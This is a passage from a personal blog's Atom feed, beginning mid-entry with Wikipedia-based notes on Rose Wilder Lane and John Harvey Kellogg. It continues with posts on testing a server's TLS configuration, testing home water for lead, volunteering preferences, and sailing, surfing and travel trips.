characterization critically needed to make the stories publishable in book form.</p><footer><strong>Literary collaboration</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Literary_collaboration'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>Even more fascinating is Lane&rsquo;s societal and political views. She was a libertarian, economically
laissez faire, anti-racist, and anti-communist. She protested paying income taxes, opposed the New
Deal, and thought Social Security was a Ponzi scheme that would destroy the United States.</p>

<blockquote><p>Lane played a hands-on role during the 1940s and 1950s in launching the &#8220;libertarian movement&#8221;
and began an extensive correspondence with figures such as DuPont executive Jasper Crane and
writer Frank Meyer, as well as her friend and colleague, Ayn Rand. She wrote book reviews
for the National Economic Council and later for the Volker Fund, out of which grew the Institute
for Humane Studies. Later, she lectured at, and gave generous financial support to, the Freedom
School headed by libertarian Robert LeFevre.</p><footer><strong>Later years and death</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Later_years_and_death'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>I want to reread the <em>Little House</em> books now knowing she was a die-hard libertarian who along with
her mother purposefully wove themes of individualism into the series.</p>

<blockquote><p>Rose Wilder Lane died in her sleep at age 81, on October 30, 1968, just as she was about to
depart on a three-year world tour. She was buried next to her parents at Mansfield Cemetery in
Mansfield, Missouri.</p><footer><strong>Later years and death</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Later_years_and_death'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<h2>3. John Harvey Kellogg</h2>

<p>I haven&rsquo;t read the entire Wikipedia entry on <a href="https://en.wikipedia.org/wiki/John_Harvey_Kellogg">John Harvey Kellogg</a> yet since
a colleague only recently drew my attention to this smart, prolific, and bizarre man. These parts
stood out to me at first glance though.</p>

<ul>
<li>he invented corn flakes with his brother, Will Keith Kellogg</li>
<li>he was a medical doctor &ldquo;who ran a sanitarium using holistic methods, with a particular focus on
nutrition, enemas, and exercise. Kellogg was an advocate of vegetarianism&rdquo;</li>
<li>he also created various phototherapeutic and electrotherapeutic inventions</li>
<li>he advocated sexual abstinence and &ldquo;advocated keeping the diet plain to prevent sexual arousal&rdquo;</li>
<li>he was an &ldquo;especially zealous campaigner against masturbation&rdquo;</li>
</ul>


<blockquote><p>He also recommended, to prevent children from this &#8220;solitary vice&#8221;, bandaging or tying their hands,
covering their genitals with patented cages and electrical shock.</p><footer><strong>Masturbation prevention</strong> <cite><a href='https://en.wikipedia.org/wiki/John_Harvey_Kellogg#Masturbation_prevention'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<ul>
<li>he liked yogurt enemas</li>
<li>he was a eugenicist</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Useful Site for TLS Server Test]]></title>
    <link href="https://www.davidxia.com/2017/05/useful-site-for-testing-tls-server-configuration/"/>
    <updated>2017-05-20T12:49:20-04:00</updated>
    <id>https://www.davidxia.com/2017/05/useful-site-for-testing-tls-server-configuration</id>
    <content type="html"><![CDATA[<p>My home server&rsquo;s hard disk&rsquo;s partition map was somehow corrupted. So I&rsquo;m serving this website
from <a href="https://m.do.co/c/74c553045962">Digital Ocean</a> for now instead of my apartment. While rewriting the nginx server configs,
I found this useful site that <a href="https://www.ssllabs.com/ssltest/index.html">tests your server&rsquo;s TLS configuration</a>. It&rsquo;ll give you a grade
and warn you of weak encryption, key exchange protocols, cipher suites, etc.</p>

<p><a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/">Mozilla&rsquo;s TLS configuration generator</a> is useful for providing secure defaults.</p>

<p>I&rsquo;m proud to say this site has an A.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[British Virgin Islands Sailing Trip Video]]></title>
    <link href="https://www.davidxia.com/2017/05/british-virgin-islands-sailing-trip-video/"/>
    <updated>2017-05-20T11:51:50-04:00</updated>
    <id>https://www.davidxia.com/2017/05/british-virgin-islands-sailing-trip-video</id>
    <content type="html"><![CDATA[<p>I finally got around to editing the footage from the sailing trip.</p>

<iframe class="fill-width" width="560" height="315" src="https://www.youtube.com/embed/7ZaCY7rHLgg" frameborder="0" allowfullscreen></iframe>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[British Virgin Islands Sailing Trip]]></title>
    <link href="https://www.davidxia.com/2017/03/british-virgin-islands-sailing-trip/"/>
    <updated>2017-03-03T21:10:36-05:00</updated>
    <id>https://www.davidxia.com/2017/03/british-virgin-islands-sailing-trip</id>
    <content type="html"><![CDATA[<p>I learned the basics of sailing on a week-long sailing trip in the British Virgin Islands aboard
a 48-foot catamaran we called Millenium Falcon.</p>

<h3>January 30</h3>

<p>We moored off the coast of Virgin Gorda and Saba Rock. President Obama was wind surfing at neighboring Necker Island as a guest of Richard Branson.</p>

<p><img class="center" src="https://i.imgur.com/xtJYYezh.jpg"></p>

<div class='image center'><img  src="https://i.imgur.com/WY4BnbMh.jpg" title="The dinghy race at Virgin Gorda." ><div class='caption'>The dinghy race at Virgin Gorda.</div></div>




<!-- more -->


<h3>January 31</h3>

<p>Anegada</p>

<p><img class="center" src="https://i.imgur.com/eZ8wlJjh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/8BhieRQh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/Z9eqNS4h.jpg"></p>

<p><img class="center" src="https://i.imgur.com/vGEIw30h.jpg"></p>

<h3>Last day - February 4</h3>

<p>Sailing through Tatch Island Cut during the race. We stopped racing because the wind died
and we needed to return the charter boat on time.</p>

<p><img class="center" src="https://i.imgur.com/rOfYB1Uh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/qofwLFhh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/3VJRFjHh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/rfuiRe4h.jpg"></p>

<div class='image center'><img  src="https://i.imgur.com/IOXPlZxh.jpg" title="Boat mate and colleague Bastian." ><div class='caption'>Boat mate and colleague Bastian.</div></div>




<div class='image center'><img  src="https://i.imgur.com/VcsIgQAh.jpg" title="The rest of my boat's crew." ><div class='caption'>The rest of my boat&#8217;s crew.</div></div>




<div class='image center'><img  src="https://i.imgur.com/62Prw81h.jpg" title="We saw lots of nice houses built on cliffs." ><div class='caption'>We saw lots of nice houses built on cliffs.</div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Test Your Home's Water for Lead]]></title>
    <link href="https://www.davidxia.com/2017/02/how-to-test-your-homes-water-for-lead/"/>
    <updated>2017-02-20T19:37:52-05:00</updated>
    <id>https://www.davidxia.com/2017/02/how-to-test-your-homes-water-for-lead</id>
    <content type="html"><![CDATA[<p>I read the <em>New York Times</em> article <a href="https://www.nytimes.com/interactive/2016/03/24/nyregion/how-nyc-gets-its-water-new-york-101.html">&ldquo;How New York Gets Its Water&rdquo;</a> a while ago. The end of the
article described how you could order a free lead testing kit.</p>

<blockquote><p>The <a href="https://www.epa.gov/sites/production/files/2015-11/documents/2005_09_14_faq_fs_homewatertesting.pdf">EPA offers some guidance</a> on how and when to obtain an in-home testing kit through your local
water supplier. In New York City, residents can obtain one <a href="http://www1.nyc.gov/nyc-resources/service/1266/water-lead-test-kit-request">at no cost through 311</a>.</p>

<p>For more information, visit <a href="www.epa.gov/safewater/lead">www.epa.gov/safewater/lead</a>, or call the Safe Drinking Water Hotline
at 1-800-426-4791.</p></blockquote>

<p>I read this article in the aftermath of the <a href="https://en.wikipedia.org/wiki/Flint_water_crisis">Flint water crisis</a> and wanted to test my
apartment&rsquo;s drinking water. I filled out the online form, received a package in the mail containing
two large plastic bottles, a pre-paid mailing label, and detailed instructions. The instructions
said to fill one bottle with water after not using any faucet in my apartment for six hours. I
filled the second bottle with water after having run the tap. After dropping the bottles now full
of water into a mailbox, NYC&rsquo;s Nureau of Water Supply sent me the results only week or so later.</p>

<blockquote><p>We have received the results of your recent tap water lead test. Both samples were under the
federal action level of 15 micrograms per liter (μg/L). Your specific results were:</p>

<p>First draw: 0 μg/L
1-2 minute flush: 0 μg/L</p></blockquote>

<p><img class="center" src="https://i.imgur.com/uxwBi0bl.jpg"></p>

<p><img class="center" src="https://i.imgur.com/98MoXGNl.jpg"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What I'm Looking for in a Volunteering Position]]></title>
    <link href="https://www.davidxia.com/2016/10/what-im-looking-for-in-a-volunteering-position/"/>
    <updated>2016-10-31T13:59:34-04:00</updated>
    <id>https://www.davidxia.com/2016/10/what-im-looking-for-in-a-volunteering-position</id>
    <content type="html"><![CDATA[<h2>My Absolute Requirements</h2>

<ul>
<li><strong>Does not require a law degree</strong>

<ul>
<li>Although I have thought about getting one just so I can apply for certain volunteering gigs that require one.</li>
</ul>
</li>
<li><strong>Does not require me to write code</strong> for a significant portion of my volunteer time. I already do
that full time and am not looking for more. I am fine giving high level tech guidance, however.</li>
</ul>


<h2>My Preferences</h2>

<p><em>In rough order of preference</em></p>

<ul>
<li>in-person and local</li>
<li>intellectually challenging</li>
<li>accommodating of my full time work schedule and personal life</li>
<li>5-10 hours a week</li>
<li>months-long to year-long commitment</li>
<li>not just a desk job but also field work</li>
</ul>


<h2>Skills I Want to Learn or Improve Upon</h2>

<p><em>In rough order of preference</em></p>

<ul>
<li>public speaking</li>
<li>community organizing and building trust with people who have different backgrounds</li>
<li>negotiating and building consensus with and between people who don&rsquo;t necessarily see eye-to-eye</li>
<li>Learning to lobby public officials and organizations</li>
<li>learning more about the law or government or various industries</li>
<li>investigative reporting</li>
</ul>


<h2>Values of Organizations in which I&rsquo;ll Thrive</h2>

<p><em>In rough order of preference</em></p>

<ul>
<li>competence</li>
<li>hard work</li>
<li>innovation or at least open-mindedness</li>
<li>passion and compassion</li>
<li>personal responsibility</li>
</ul>


<h2>Skills I Can Contribute</h2>

<p><em>In rough order of ability</em></p>

<ul>
<li>writing code, creating web sites, general computer stuff (see my <a href="https://github.com/davidxia">github</a>)</li>
<li>writing prose such as reports, summaries, and essays (see my <a href="https://www.davidxia.com/">blog</a>)</li>
<li>analytical and quantitative (I was a math major in college. Now I work at Spotify as a software
engineer.)</li>
<li>effective at collaborating and working as part of a team</li>
<li>good at spoken communication</li>
<li>has a knack for establishing rapport and building strong relationships with all kinds of people</li>
</ul>


<!-- more -->


<h2>Causes I Believe In</h2>

<p><em>In rough order of preference</em></p>

<ul>
<li>civil rights

<ul>
<li>&ldquo;protect individuals&#8217; freedom from infringement by governments, social organizations, and
private individuals. They ensure one&rsquo;s ability to participate in the civil and political life
of the society and state without discrimination or repression&rdquo;</li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Environmentalism">environmentalism</a>

<ul>
<li>&ldquo;advocate for the lawful preservation, restoration and/or improvement of the natural
environment&rdquo;</li>
<li>&ldquo;attempt to balance relations between humans and the various natural systems on which they
depend in such a way that all the components are accorded a proper degree of sustainability&rdquo;</li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Consumer_protection">consumer protection</a>

<ul>
<li>&ldquo;promoting laws and organizations that ensure the rights of consumers as well as fair trade,
competition and accurate information in the marketplace. The laws are designed to prevent
businesses that engage in fraud or specified unfair practices from gaining an advantage over
competitors&rdquo;</li>
</ul>
</li>
<li><a href="http://www.nypirg.org/goodgov/">good governance</a>

<ul>
<li>&ldquo;advocate for eliminating barriers to voting, fighting for better ethics oversight and limiting
the role of powerful interests in elections,&rdquo; etc</li>
<li>examples include making &ldquo;campaign finance information for state and local candidates&rdquo;
available on the Internet, reporting &ldquo;lobbying of state agencies and local governments&rdquo;,
deterring and justly punishing ethical misconduct, and making legislative and budgetary
processes more transparent.</li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Labor_rights">labor rights</a>

<ul>
<li>advocating for &ldquo;legal rights and claimed human rights having to do with labor relations
between workers and their employers, usually obtained under labor and employment law. In
general, these rights&#8217; debates have to do with negotiating workers&#8217; pay, benefits, and safe
working conditions&rdquo;</li>
<li>e.g. <a href="http://www.nytimes.com/2016/08/24/business/graduate-students-clear-hurdle-in-effort-to-form-union.html">Grad Students Win Right to Unionize in an Ivy League Case</a></li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Community_organizing">community organizing</a>

<ul>
<li>&ldquo;community organizers generally assume that social change necessarily involves conflict and
social struggle in order to generate collective power for the powerless. A core goal of
community organizing is to generate durable power for an organization representing the
community, allowing it to influence key decision-makers on a range of issues over time&rdquo;</li>
</ul>
</li>
<li><a href="https://en.wikipedia.org/wiki/Community_development#Definitions">community development</a></li>
<li>Education</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A Recent Family Photo]]></title>
    <link href="https://www.davidxia.com/2016/09/a-recent-family-photo/"/>
    <updated>2016-09-18T18:29:07-04:00</updated>
    <id>https://www.davidxia.com/2016/09/a-recent-family-photo</id>
    <content type="html"><![CDATA[<div class='image center'><img  src="https://i.imgur.com/mwtquEjl.jpg" width="640" height="640" title="Post-dimsum photo with my parents and maternal grandparents on their weekend visit to NYC." ><div class='caption'>Post-dimsum photo with my parents and maternal grandparents on their weekend visit to NYC.</div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Southern UK 2016]]></title>
    <link href="https://www.davidxia.com/2016/07/southern-uk-2016/"/>
    <updated>2016-07-24T18:09:24-04:00</updated>
    <id>https://www.davidxia.com/2016/07/southern-uk-2016</id>
    <content type="html"><![CDATA[<p>My trip with my parents to southern UK in March this year. The video includes highlights from
London, Cambridge, Seven Sisters, Jurassic Coast, Lyme Regis, and Lulworth Cove.</p>

<iframe class="fill-width" width="540" height="304" src="https://www.youtube-nocookie.com/embed/seJO_6-Tk2Q?rel=0" frameborder="0" allowfullscreen></iframe>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My First Sailing Class]]></title>
    <link href="https://www.davidxia.com/2016/07/my-first-sailing-class/"/>
    <updated>2016-07-24T13:37:56-04:00</updated>
    <id>https://www.davidxia.com/2016/07/my-first-sailing-class</id>
    <content type="html"><![CDATA[<p>Last weekend a bunch of Spotify collleagues and I took our first sailing classes at Manhattan Yacht
Club in Jersey City. I could get used to this sport. The sun was brutal though. I&rsquo;ll never get used
to that.</p>

<iframe class="fill-width" width="540" height="405" src="https://www.youtube.com/embed/8hPEr4sa-YM" frameborder="0" allowfullscreen></iframe>




<!-- more -->


<p><img class="center" src="https://i.imgur.com/g6jwSpXl.jpg" width="480" height="640"></p>

<div class='image center'><img  src="https://i.imgur.com/rbyvOtml.jpg" width="480" height="640" title="I had to wear a hot and stuffy life vest on a 90-degree day." ><div class='caption'>I had to wear a hot and stuffy life vest on a 90-degree day.</div></div>




<div class='image center'><img  src="https://i.imgur.com/5cHxUtKl.jpg" width="480" height="640" title="A great view of lower Manhattan." ><div class='caption'>A great view of lower Manhattan.</div></div>




<div class='image center'><img  src="https://i.imgur.com/ivnVCYXl.jpg" width="480" height="640" title="Sailing close to the Statue of Liberty." ><div class='caption'>Sailing close to the Statue of Liberty.</div></div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Spotify-organized Surfing Trip in Santa Teresa, Costa Rica 2015]]></title>
    <link href="https://www.davidxia.com/2016/07/spotify-organized-surfing-trip-in-costa-rica-2015/"/>
    <updated>2016-07-09T10:13:29-04:00</updated>
    <id>https://www.davidxia.com/2016/07/spotify-organized-surfing-trip-in-costa-rica-2015</id>
    <content type="html"><![CDATA[<p>In March 2015, about twenty colleagues and I went on a Spotify-organized surf trip to Santa Teresa,
Costa Rica for a week of surf lessons. The company, surf, and food were unforgettable. One of Spotify&rsquo;s
social events organizers knew <a href="www.surfakademin.se">a group of traveling Swedish surf instructors</a>,
and helped get a group discount for Spotifiers and their guests. The total cost of lodging, lessons,
and daily breakfast and lunch was about $650 for a week.</p>

<div class='image center'><img  src="https://i.imgur.com/WvJyqW4l.jpg" width="640" height="480" title="The relaxing mini-resort where we stayed. It had a pool, lounge areas, and a small cafe." ><div class='caption'>The relaxing mini-resort where we stayed. It had a pool, lounge areas, and a small cafe.</div></div>


<p>The best memories I have from the trip are waking up at the crack of dawn every day, grabbing a
surf board, and rushing headlong into the water. The sun was gentle in the early morning, but the
waves were not. The force and speed of the ocean awed and at times terrified me. I&rsquo;d paddle like mad
to get over waves, but every once in a while, a monster swell would catch me at the worst moment.
The crest of the wave would hit me like a hammer and sweep me aside like a match stick. I was taught
to cover my head with my arms to prevent the surf board from giving me a concussion.
Eventually I learned to do a turtle roll and was able to see a bit ahead of time if a wave would be
large or small.</p>

<!--more-->




<div class='image center'><img  src="https://i.imgur.com/Lj4BEIel.jpg" width="640" height="480" title="The large suite in which I lived with my two non-Spotify friends I invited: Grace Gui and Jason Alarcon." ><div class='caption'>The large suite in which I lived with my two non-Spotify friends I invited: Grace Gui and Jason Alarcon.</div></div>


<p>After a couple of hours of surfing on an empty stomach, I would be ravenous. Our group would trudge
back to the resort where several Costa Rican women staff members had prepared a large
breakfast for us: scrambled eggs, watermelon and pineapple,
salad, rice and beans, and plantains. I&rsquo;d go back for seconds and thirds.</p>

<div class='image center'><img  src="https://i.imgur.com/QQ2zrxil.jpg" width="640" height="480" title="From left to right: Mo Tracey, Fredrik Johansson, Chris Hansen, Jeffrey Foster, David Xia, and Grace Gui." ><div class='caption'>From left to right: Mo Tracey, Fredrik Johansson, Chris Hansen, Jeffrey Foster, David Xia, and Grace Gui.</div></div>


<p>One of my colleagues Fredrik and I were pretty good beginners and had the privilege of being invited
by the instructors to a different beach at least an hour&rsquo;s drive away from the
resort. Fredrik and I rode in a taxi with one of the instructors and two other guests who were
seasoned surfers. The ride through dirt and gravel roads was bumpy and hot and all around unpleasant.
A sandless beach awaited us when we arrived. I lathered on sunscreen to protect against the intense
midday sun, took my board, and carefully walked across the seemingly endless stretch of sharp rocks
until I could mount my board and start paddling. After an hour of surfing, I remember being
exhausted but extremely grateful that I was lucky enough to experience the raw power of mother
nature in such a majestic setting. I was also extremely grateful I hadn&rsquo;t been injured so far on the
trip. The waves could be truly terrifying.</p>

<div class='image center'><img  src="https://i.imgur.com/dBL3Hw0l.jpg" width="640" height="480" title="I guess I couldn't keep my balance." ><div class='caption'>I guess I couldn&#8217;t keep my balance.</div></div>


<div class='image center'><img  src="https://i.imgur.com/EExUThOl.jpg" width="480" height="640" title="I can't remember what we were trying to do in the pool." ><div class='caption'>I can&#8217;t remember what we were trying to do in the pool.</div></div>



]]></content>
  </entry>
  
</feed>
